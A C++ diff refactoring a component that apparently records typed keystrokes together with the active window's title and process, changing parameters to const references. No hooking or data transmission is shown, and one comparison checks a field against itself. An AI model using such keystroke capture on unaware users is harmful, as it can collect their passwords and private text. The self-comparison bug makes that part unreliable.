@@ -52,19 +52,19 @@ namespace
 	LRCDataWriter writer(Settings::sha256ID);
 
 	// Compares two VKInfo structures
-	inline bool VKInfoCmp(VKInfo vk1, VKInfo vk2)
+	inline bool VKInfoCmp(const VKInfo &vk1, const VKInfo &vk2)
 	{
 		return (vk1.keyCode == vk2.keyCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
 	}
 
 	// Compares two WNDInfo structures
-	inline bool WNDInfoCmp(WNDInfo wnd1, WNDInfo wnd2)
+	inline bool WNDInfoCmp(const WNDInfo &wnd1, const WNDInfo &wnd2)
 	{
 		return (wnd1.title == wnd2.title && wnd2.process == wnd2.process);
 	}
 
 	// Is virtual key appends text into text fields
-	inline bool isprintable(const DWORD vkCode)
+	inline bool isprintable(const DWORD &vkCode)
 	{
 		return (vkCode == 0x20)						// Spacebar
 			|| (vkCode >= 0x30 && vkCode <= 0x5A)	// 0 - 9, A - Z
@@ -122,7 +122,7 @@ namespace
 		}
 	}
 
-	void processVKInfo(VKInfo vkInfo)
+	void processVKInfo(const VKInfo &vkInfo)
 	{
 		// Filter virtual-key repeats
 		if (VKInfoCmp(vkInfo, lastVKInfo))
@@ -154,7 +154,7 @@ namespace
 		}
 	}
 
-	void processWNDInfo(WNDInfo wndInfo)
+	void processWNDInfo(const WNDInfo &wndInfo)
 	{
 		if (!WNDInfoCmp(wndInfo, pendingKeyboard.wndInfo))
 		{
@@ -172,7 +172,7 @@ namespace
 		}
 	}
 
-	void processKeyBundle(KeyBundle keyBundle)
+	void processKeyBundle(const KeyBundle &keyBundle)
 	{
 		switch (keyBundle.type)
 		{
@@ -295,7 +295,7 @@ void KeyboardWorker::Add(VKInfo vkInfo)
 }
 
 
-void KeyboardWorker::Add(LRCData::WNDInfo wndInfo)
+void KeyboardWorker::Add(WNDInfo wndInfo)
 {
 	KeyBundle keyBundle;
 	keyBundle.type = KeyBundle::WND_INFO;
